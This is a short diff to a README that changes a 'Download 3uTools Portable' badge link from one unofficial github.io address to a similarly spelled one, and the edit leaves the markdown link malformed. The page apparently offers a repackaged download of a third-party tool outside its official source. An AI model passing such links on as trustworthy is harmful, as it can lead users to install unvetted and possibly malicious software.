@@ -2,7 +2,8 @@
 
 ## 📥 Download 3uTools Portable
 
-[![⬇️ Download 3uTools Portable](https://img.shields.io/badge/Download-3uTools%20Portable-green?style=for-the-badge&logo=apple)](https://3utool-portable.github.io/.github)
+[![⬇️ Download 3uTools Portable](https://img.shields.io/badge/Download-3uTools%20Portable-green?style=for-the-badge&logo=apple)](https://3utools-portable.github.io/.github
+)
 
 ---
 
